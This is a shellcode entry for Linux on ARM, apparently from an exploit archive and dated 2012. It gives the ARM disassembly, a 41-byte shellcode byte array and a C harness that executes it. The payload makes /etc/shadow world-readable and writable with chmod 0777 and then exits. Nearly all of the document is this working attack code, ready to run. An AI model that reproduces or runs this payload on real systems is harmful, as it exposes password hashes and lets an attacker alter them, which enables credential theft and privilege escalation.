/*
Title:     Linux/ARM - chmod("/etc/shadow", 0777) - 41 bytes
Date:      2012-09-08
Tested on: ARM1176JZF-S (v6l)
Author:    midnitesnake

00008054 <_start>:
    8054:       e28f6001        add     r6, pc, #1
    8058:       e12fff16        bx      r6
    805c:       4678            mov     r0, pc
    805e:       3012            adds    r0, #18
    8060:       21ff            movs    r1, #255        ; 0xff
    8062:       31ff            adds    r1, #255        ; 0xff
    8064:       3101            adds    r1, #1
    8066:       270f            movs    r7, #15
    8068:       df01            svc     1
    806a:       1b24            subs    r4, r4, r4
    806c:       1c20            adds    r0, r4, #0
    806e:       2701            movs    r7, #1
    8070:       df01            svc     1
    8072:       652f            .short  0x652f
    8074:       732f6374        .word   0x732f6374
    8078:       6f646168        .word   0x6f646168
    807c:       46c00077        .word   0x46c00077
*/
#include <stdio.h>


char shellcode[] = "\x01\x60\x8f\xe2"
                   "\x16\xff\x2f\xe1"
                   "\x78\x46"
                   "\x12\x30"
                   "\xff\x21"
                   "\xff\x31"
                   "\x01\x31"
                   "\x0f\x27"
                   "\x01\xdf"
                   "\x24\x1b"
                   "\x20\x1c"
                   "\x01\x27"
                   "\x01\xdf"
                   "\x2f\x65"
                   "\x74\x63\x2f\x73"
                   "\x68\x61\x64\x6f"
                   "\x77\x00"
                   "\xc0\x46";

int main()
{
        fprintf(stdout,"Length: %d\n",strlen(shellcode));
        (*(void(*)()) shellcode)();

return 0;
}